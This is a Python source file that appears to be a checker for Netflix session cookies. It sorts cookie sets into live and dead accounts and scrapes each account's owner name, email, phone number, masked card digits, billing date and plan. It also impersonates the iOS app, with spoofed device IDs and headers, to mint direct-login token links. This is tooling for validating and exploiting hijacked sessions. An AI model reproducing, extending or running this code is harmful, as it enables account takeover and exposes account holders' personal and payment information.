import asyncio
import contextlib
import html
import logging
import random
import re
import string
import urllib.parse
import uuid

from curl_cffi.requests import AsyncSession
from deep_translator import GoogleTranslator


async def _translate_to_english(text: str) -> str:
    if not text or text == "N/A":
        return text
    try:

        def _do_translate():
            return GoogleTranslator(source="auto", target="en").translate(text)

        return await asyncio.to_thread(_do_translate)
    except Exception:
        return text


logger = logging.getLogger(__name__)

COUNTRY_CODES = {
    "US": "United States",
    "GB": "United Kingdom",
    "CA": "Canada",
    "AU": "Australia",
    "IN": "India",
    "BR": "Brazil",
    "FR": "France",
    "DE": "Germany",
    "IT": "Italy",
    "ES": "Spain",
    "MX": "Mexico",
    "JP": "Japan",
    "KR": "South Korea",
    "NL": "Netherlands",
    "SE": "Sweden",
    "CH": "Switzerland",
    "AR": "Argentina",
    "CO": "Colombia",
    "CL": "Chile",
    "PE": "Peru",
    "TR": "Turkey",
    "ZA": "South Africa",
    "RU": "Russia",
    "SG": "Singapore",
    "MY": "Malaysia",
    "PH": "Philippines",
    "ID": "Indonesia",
    "TH": "Thailand",
    "VN": "Vietnam",
    "TW": "Taiwan",
    "HK": "Hong Kong",
    "NZ": "New Zealand",
    "IE": "Ireland",
    "NO": "Norway",
    "DK": "Denmark",
    "FI": "Finland",
    "PT": "Portugal",
    "GR": "Greece",
    "AT": "Austria",
    "BE": "Belgium",
    "PL": "Poland",
    "CZ": "Czech Republic",
    "HU": "Hungary",
    "RO": "Romania",
    "UA": "Ukraine",
    "IL": "Israel",
    "AE": "United Arab Emirates",
    "SA": "Saudi Arabia",
    "EG": "Egypt",
    "MA": "Morocco",
    "NG": "Nigeria",
    "KE": "Kenya",
    "LT": "Lithuania",
    "LV": "Latvia",
    "EE": "Estonia",
    "RS": "Serbia",
    "HR": "Croatia",
    "SI": "Slovenia",
    "SK": "Slovakia",
    "BG": "Bulgaria",
}


def get_country_with_flag(code):
    if not code or code == "N/A" or len(code) != 2:
        return code
    code = code.upper()
    flag = chr(ord(code[0]) + 127397) + chr(ord(code[1]) + 127397)
    name = COUNTRY_CODES.get(code, code)
    return f"{name} {flag}"


# The specific version path (/15.48) is highly volatile and Netflix often deprecates it causing 404s.
# We generalize the endpoint.
NFTOKEN_API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/latest"


def get_random_esn():
    return f"NFAPPL-02-IPHONE8%3D1-PXA-{''.join(random.choices(string.ascii_uppercase + string.digits, k=120))}"


def get_random_guid():
    return "".join(random.choices(string.ascii_uppercase + string.digits, k=24))


def get_nftoken_params():
    return {
        "appVersion": "15.48.1",
        "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
        "device_type": "NFAPPL-02-",
        "esn": get_random_esn(),
        "idiom": "phone",
        "iosVersion": "15.8.5",
        "isTablet": "false",
        "languages": "en-US",
        "locale": "en-US",
        "maxDeviceWidth": "375",
        "model": "saget",
        "modelType": "IPHONE8-1",
        "odpAware": "true",
        "path": '["account","token","default"]',
        "pathFormat": "graph",
        "pixelDensity": "2.0",
        "progressive": "false",
        "responseFormat": "json",
    }


def get_nftoken_headers():
    guid = get_random_guid()
    top_uuid = str(uuid.uuid4()).upper()
    return {
        "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
        "x-netflix.request.attempt": "1",
        "x-netflix.request.client.user.guid": guid,
        "x-netflix.context.profile-guid": guid,
        "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
        "x-netflix.context.app-version": "15.48.1",
        "x-netflix.argo.translated": "true",
        "x-netflix.context.form-factor": "phone",
        "x-netflix.context.sdk-version": "2012.4",
        "x-netflix.client.appversion": "15.48.1",
        "x-netflix.context.max-device-width": "375",
        "x-netflix.tracing.cl.useractionid": str(uuid.uuid4()).upper(),
        "x-netflix.client.type": "argo",
        "x-netflix.client.ftl.esn": get_random_esn().replace("%3D", "="),
        "x-netflix.context.locales": "en-US",
        "x-netflix.context.top-level-uuid": top_uuid,
        "x-netflix.client.iosversion": "15.8.5",
        "accept-language": "en-US;q=1",
        "x-netflix.context.os-version": "15.8.5",
        "x-netflix.request.client.context": '{"appState":"foreground"}',
        "x-netflix.context.ui-flavor": "argo",
        "x-netflix.argo.nfnsm": "9",
        "x-netflix.context.pixel-density": "2.0",
        "x-netflix.request.toplevel.uuid": top_uuid,
    }


def decode_netflix_value(value):
    if value is None:
        return None
    cleaned = html.unescape(str(value))
    cleaned = cleaned.replace("\\/", "/").replace('\\"', '"').replace("\\n", " ").replace("\\t", " ")
    cleaned = re.sub(r"\\u([0-9a-fA-F]{4})", lambda m: chr(int(m.group(1), 16)), cleaned)
    cleaned = re.sub(r"\\x([0-9a-fA-F]{2})", lambda m: chr(int(m.group(1), 16)), cleaned)
    if "%" in cleaned:
        with contextlib.suppress(ValueError, TypeError):
            cleaned = urllib.parse.unquote(cleaned)
    return cleaned.strip() or None


def parse_boolean_value(value):
    if isinstance(value, bool):
        return value
    if isinstance(value, (int, float)):
        return value == 1
    cleaned = decode_netflix_value(value)
    if not cleaned:
        return None
    low = cleaned.lower()
    if low in {"true", "yes", "1", "on"}:
        return True
    if low in {"false", "no", "0", "off"}:
        return False
    return None


def format_boolean_label(value):
    parsed = parse_boolean_value(value)
    if parsed is True:
        return "Yes"
    if parsed is False:
        return "No"
    return None


def extract_first_match(text, patterns):
    for p in patterns:
        m = re.search(p, text)
        if m:
            if m.groups():
                return decode_netflix_value(m.group(1))
            return decode_netflix_value(m.group(0))
    return None


def extract_bool_value(text, patterns):
    val = extract_first_match(text, patterns)
    return format_boolean_label(val) if val else None


def extract_profile_names(text):
    names = []
    # Try GraphQL
    for m in re.finditer(r'"profileName"\s*:\s*"([^"]+)"', text):
        d = decode_netflix_value(m.group(1))
        if d and d not in names:
            names.append(d)

    # Fallback to HTML buttons for profiles
    html_names = []
    for m in re.finditer(r'<button[^>]*aria-label="([^"]+)"[^>]*data-cl-view="accountProfileSettings"', text):
        d = decode_netflix_value(m.group(1))
        if d and d not in html_names:
            html_names.append(d)

    if len(html_names) > len(names):
        names = html_names

    if not names:
        return None
    return f"{', '.join(names)} ({len(names)})"


def extract_info_from_graphql(response_text):
    info = {
        "accountOwnerName": extract_first_match(
            response_text,
            [
                r'userInfo"\s*:\s*\{\s*"name"\s*:\s*"([^"]+)"',
                r'"accountOwnerName"\s*:\s*"([^"]+)"',
                r'"name"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"',
            ],
        ),
        "email": extract_first_match(
            response_text, [r'"emailAddress"\s*:\s*"([^"]+)"', r'"email"\s*:\s*"([^"]+)"', r'"loginId"\s*:\s*"([^"]+)"']
        ),
        "countryOfSignup": extract_first_match(
            response_text, [r'"currentCountry"\s*:\s*"([^"]+)"', r'"countryOfSignup":\s*"([^"]+)"']
        ),
        "memberSince": extract_first_match(response_text, [r'"memberSince":\s*"([^"]+)"']),
        "nextBillingDate": extract_first_match(
            response_text,
            [
                r'"nextBillingDate"\s*:\s*"([^"]+)"',
                r'"nextBillingDate"\s*:\s*\{[^}]*?"value"\s*:\s*"([^"]+)"',
                r'"nextBillingDate"\s*:\s*\{[^}]*?"formattedDate"\s*:\s*"([^"]+)"',
                r'"nextBilling"\s*:\s*\{[^}]*?"value"\s*:\s*"([^"]+)"',
                r'data-uia="account-overview-page\+membership-card\+description"[^>]*>[^:]*:\s*([^<]+)',
            ],
        ),
        "showExtraMemberSection": extract_bool_value(
            response_text,
            [
                r'"showExtraMemberSection":\s*\{\s*"fieldType":\s*"Boolean",\s*"value":\s*(true|false)',
                r'"showExtraMemberSection"\s*:\s*(true|false)',
            ],
        ),
        "membershipStatus": extract_first_match(response_text, [r'"membershipStatus":\s*"([^"]+)"']),
        "maxStreams": extract_first_match(
            response_text,
            [r'maxStreams":\{"fieldType":"Numeric","value":([^,]+),', r'"maxStreams"\s*:\s*"?([^",}]+)"?'],
        ),
        "localizedPlanName": extract_first_match(
            response_text,
            [
                r'localizedPlanName":\{"fieldType":"String","value":"([^"]+)"',
                r'"localizedPlanName"\s*:\s*"([^"]+)"',
                r'"planName"\s*:\s*"([^"]+)"',
                r'"currentPlan"\s*:\s*\{[\s\S]*?"plan"\s*:\s*\{[\s\S]*?"name"\s*:\s*"([^"]+)"',
                r'"MemberPlan"\s*,\s*"fields"\s*:\s*\{\s*"localizedPlanName"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"',
                r'"growthAccount"[\s\S]{0,500}?"currentPlan"[\s\S]{0,200}?"name"\s*:\s*"([^"]+)"',
            ],
        ),
        "planPrice": extract_first_match(
            response_text,
            [
                r'"formattedPlanPrice"\s*:\s*"([^"]+)"',
                r'"formattedPrice"\s*:\s*"([^"]+)"',
                r'"planPrice"\s*:\s*"([^"]+)"',
                r'"planPriceDisplay"\s*:\s*"([^"]+)"',
            ],
        ),
        "paymentMethodType": extract_first_match(
            response_text,
            [
                r'"paymentMethod"\s*:\s*"([^"]+)"',
                r'"paymentType"\s*:\s*"([^"]+)"',
                r'"paymentMethodType"\s*:\s*"([^"]+)"',
                r'"paymentOptionLogo"\s*:\s*"([^"]+)"',
                r'"paymentOptionLogo"\s*:\s*\{[^}]*?"paymentOptionLogo"\s*:\s*"([^"]+)"',
                r'"payer"\s*:\s*"([^"]+)"',
                r'data-uia="account-overview-page\+membership-card\+payment\+details-icon"[^>]*src="[^"]+/([^/.]+)\.png"',
                r'data-uia="payment-mop-icon"[^>]*alt="([^"]+)"',
                r'data-uia="account-overview-page\+membership-card\+subtitle-free-trial"[^>]*>\s*([^<]+)\s*</span>',
            ],
        ),
        "maskedCard": extract_first_match(
            response_text,
            [
                r'"paymentMethodLast4"\s*:\s*"([^"]+)"',
                r'"lastFour"\s*:\s*"([^"]+)"',
                r'"maskedCard"\s*:\s*"([^"]+)"',
                r'"__typename"\s*:\s*"GrowthCardPaymentMethod"[^}]*?"displayText"\s*:\s*"([^"]+)"',
                r'"growthPaymentMethods"[\s\S]{0,150}?"displayText"\s*:\s*"([^"]+)"',
                r'data-uia="account-overview-page\+membership-card\+payment\+details"[^>]*>.*?(?:••••|\*+)\s*(\d{4})',
            ],
        ),
        "phoneNumber": extract_first_match(
            response_text,
            [
                r'"phoneNumberDigits"\s*:\s*\{[\s\S]*?"value"\s*:\s*"([^"]+)"',
                r'"phoneNumber"\s*:\s*"([^"]+)"',
                r'"mobilePhone"\s*:\s*"([^"]+)"',
            ],
        ),
        "phoneVerified": extract_bool_value(
            response_text,
            [
                r'"phoneVerified"\s*:\s*(true|false)',
                r'"isPhoneVerified"\s*:\s*(true|false)',
                r'"rawPhoneNumber"\s*:\s*\{[^}]*?"isVerified"\s*:\s*(true|false)',
            ],
        ),
        "videoQuality": extract_first_match(
            response_text,
            [
                r'videoQuality"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"',
                r'"videoQuality"\s*:\s*"([^"]+)"',
                r'"quality"\s*:\s*"([^"]+)"',
            ],
        ),
        "holdStatus": extract_bool_value(
            response_text,
            [
                r'"holdStatus"\s*:\s*(true|false)',
                r'"isUserOnHold"\s*:\s*(true|false)',
                r'"isOnHold"\s*:\s*(true|false)',
                r'"membershipHold"\s*:\s*(true|false)',
            ],
        ),
        "isCancelled": bool(
            re.search(
                r'membershipStatus"\s*:\s*"CANCELLED"|data-uia="account-overview-page\+membership-card\+subtitle-cancelled"|"willBeCancelled"\s*:\s*true',
                response_text,
                re.IGNORECASE,
            )
        ),
        "isPaymentMissing": bool(
            re.search(
                r'data-uia="account-overview-page\+membership-card\+add-payment"|"paymentMethodMissing"\s*:\s*true',
                response_text,
                re.IGNORECASE,
            )
        ),
        "emailVerified": extract_bool_value(
            response_text,
            [
                r'"isEmailVerified"\s*:\s*(true|false)',
                r'"emailVerified"\s*:\s*(true|false)',
                r'"growthEmail"\s*:\s*\{[^}]*?"isVerified"\s*:\s*(true|false)',
                r'"email"\s*:\s*\{[^}]*?"isVerified"\s*:\s*(true|false)',
            ],
        ),
        "profiles": extract_profile_names(response_text),
        "isFreeTrial": bool(
            re.search(
                r'data-uia="account-overview-page\+membership-card\+subtitle-free-trial"|membershipStatus"\s*:\s*"FREE_TRIAL"',
                response_text,
            )
        ),
    }

    if (
        info.get("maskedCard")
        and re.fullmatch(r"\d{4}", info["maskedCard"])
        and info.get("paymentMethodType") in {None, "", "Yes"}
    ):
        info["paymentMethodType"] = "CC"

    return {k: v for k, v in info.items() if v is not None}


async def generate_direct_login_link_api(cookies_list):
    # Dedup cookies by name, keeping the first occurrence (which is usually the valid one)
    seen = set()
    deduped = []
    for c in cookies_list:
        c_name = str(c.get("name", "")).strip()
        c_val = str(c.get("value", "")).strip()
        if c_name and c_val and c_name not in seen:
            seen.add(c_name)
            deduped.append({"name": c_name, "value": c_val})

    cookie_str = "; ".join([f"{c['name']}={c['value']}" for c in deduped])

    if "netflixid" not in cookie_str.lower():
        return "NO_NFTOKEN_FOUND"

    headers = get_nftoken_headers()
    headers["Cookie"] = cookie_str

    try:
        async with AsyncSession(impersonate="chrome124") as session:
            resp = await session.get(
                NFTOKEN_API_URL, params=get_nftoken_params(), headers=headers, timeout=10
            )
            if resp.status_code in [403, 429]:
                return "RATE_LIMIT"
            if resp.status_code == 200:
                data = resp.json()
                token_data = (((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {}
                token = decode_netflix_value(token_data.get("token"))
                if token:
                    return f"https://www.netflix.com/unsupported?nftoken={token}"
    except Exception as e:
        logger.error(f"Error fetching nftoken: {e}")
        return "ERROR"

    return "NO_NFTOKEN_FOUND"


async def fetch_enhanced_account_details(cookies_list):
    # Preserve EXACT raw cookie values so Netflix doesn't reject unquoted characters in ct%3D or v%3D
    clean_cookies = []
    for c in cookies_list:
        c_name = str(c.get("name", "")).strip()
        c_val = str(c.get("value", "")).strip()
        if c_name and c_val:
            clean_cookies.append(f"{c_name}={c_val}")

    cookie_str = "; ".join(clean_cookies)
    cookie_str_lower = cookie_str.lower()
    # Fast path: If neither NetflixId nor SecureNetflixId is present, cookie is guaranteed dead
    if "netflixid" not in cookie_str_lower and "securenetflixid" not in cookie_str_lower:
        return {"error": "no_cookies", "status": "DEAD"}

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Cookie": cookie_str,
    }

    try:
        async with AsyncSession(impersonate="chrome124") as session:
            # 1. Try /account page (universal entry point)
            resp = await session.get(
                "https://www.netflix.com/account", headers=headers, timeout=10
            )
            if resp.status_code in [429, 403]:
                return {"error": "rate_limit"}
            if resp.status_code in [500, 502, 503, 504]:
                return {"error": "server_error"}

            # Check if redirected to login/signup page (cookie expired / password changed)
            resp_url = str(resp.url).lower() if hasattr(resp, "url") else ""
            if "/login" in resp_url or "/signup" in resp_url:
                return {"error": "login_redirect", "status": "DEAD"}

            if resp.status_code != 200:
                return {"error": f"http_{resp.status_code}"}

            html_text = resp.text
            info1 = extract_info_from_graphql(html_text)

            # If /account didn't yield plan or email, try /account/membership
            if not info1.get("localizedPlanName") or not info1.get("email"):
                resp2 = await session.get("https://www.netflix.com/account/membership", headers=headers, timeout=10)
                if resp2.status_code == 200:
                    info2 = extract_info_from_graphql(resp2.text)
                    for k, v in info2.items():
                        if k not in info1 or not info1.get(k):
                            info1[k] = v

            payment_method = info1.get("paymentMethodType", "N/A")
            masked_card = info1.get("maskedCard", "N/A")

            package_str = payment_method
            if masked_card != "N/A" and masked_card:
                if package_str == "N/A":
                    package_str = masked_card
                else:
                    package_str += f" {masked_card}"

            if package_str == "N/A" and info1.get("isFreeTrial"):
                package_str = "Free Trial"

            extra_mems = info1.get("showExtraMemberSection")
            if extra_mems == "Yes":
                extra_mems_str = "Yes ✅"
            elif extra_mems == "No":
                extra_mems_str = "No ❌"
            else:
                extra_mems_str = "N/A"

            result = {
                "plan": info1.get("localizedPlanName", "N/A"),
                "email": info1.get("email", "N/A"),
                "phone_number": info1.get("phoneNumber", "N/A"),
                "member_since": info1.get("memberSince", "N/A"),
                "country": get_country_with_flag(info1.get("countryOfSignup", "N/A")),
                "profiles": info1.get("profiles", "N/A"),
                "video_quality": info1.get("videoQuality", "N/A"),
                "max_streams": info1.get("maxStreams", "N/A"),
                "next_billing": info1.get("nextBillingDate", "N/A"),
                "payment_method": payment_method,
                "masked_card": masked_card,
                "package": package_str,
                "extra_members": extra_mems_str,
                "last_viewed": "N/A",
                "email_verified": "✅ Verified"
                if info1.get("emailVerified") == "Yes"
                else ("❌ Non-verified" if info1.get("emailVerified") == "No" else "N/A"),
                "phone_verified": "✅ Verified"
                if info1.get("phoneVerified") == "Yes"
                else ("❌ Non-verified" if info1.get("phoneVerified") == "No" else "N/A"),
                "hold_status": info1.get("holdStatus", "No"),
                "is_on_hold": bool(
                    str(info1.get("holdStatus", "")).lower() in ["yes", "true"]
                    or str(info1.get("isUserOnHold", "")).lower() in ["yes", "true"]
                    or str(info1.get("isOnHold", "")).lower() in ["yes", "true"]
                ),
                "is_cancelled": info1.get("isCancelled", False),
                "is_payment_missing": info1.get("isPaymentMissing", False),
                "membership_status": info1.get("membershipStatus", "N/A"),
                "is_free_trial": info1.get("isFreeTrial", False),
            }

            # Package name fallback if localizedPlanName is missing
            if result["plan"] == "N/A" and result["video_quality"] != "N/A":
                result["plan"] = f"{result['video_quality']} Plan"
            elif result["plan"] != "N/A":
                # Translate plan
                result["plan"] = await _translate_to_english(result["plan"])

            return result
    except Exception as e:
        logger.error(f"Error fetching account info: {e}")
        return {"error": "network_error", "details": str(e)}
